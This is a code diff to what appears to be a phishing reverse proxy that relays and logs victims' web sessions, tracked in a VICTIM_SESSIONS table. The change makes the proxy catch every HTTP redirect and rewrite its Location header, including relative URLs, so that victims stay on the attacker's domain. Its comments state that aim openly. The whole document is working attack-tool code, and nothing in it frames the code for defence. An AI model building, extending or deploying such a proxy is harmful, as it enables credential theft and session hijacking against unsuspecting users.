@@ -280,24 +280,29 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
         logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
             .catch(error => displayError("Log encryption failed", error));
 
-        if (isNavigationRequest &&
-            proxyRequestOptions.headers.host === VICTIM_SESSIONS[currentSession].host &&
-            proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
-
+        // Always handle redirects, not just for navigation requests
+        if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
             const proxyResponseLocation = proxyResponse.headers.location;
             if (proxyResponseLocation) {
                 try {
                     const locationURL = new URL(proxyResponseLocation);
 
+                    // Update session information
                     VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                     VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                     VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
                     VICTIM_SESSIONS[currentSession].port = locationURL.port;
                     VICTIM_SESSIONS[currentSession].host = locationURL.host;
 
+                    // Replace the host in the location header to keep the user on our domain
                     proxyResponse.headers.location = proxyResponseLocation.replace(locationURL.host, proxyHostname);
                 } catch {
+                    // If it's a relative URL, update the path
                     VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
+                    // For relative URLs, prepend our domain
+                    if (proxyResponseLocation.startsWith('/')) {
+                        proxyResponse.headers.location = `https://${proxyHostname}${proxyResponseLocation}`;
+                    }
                 }
             }
         }
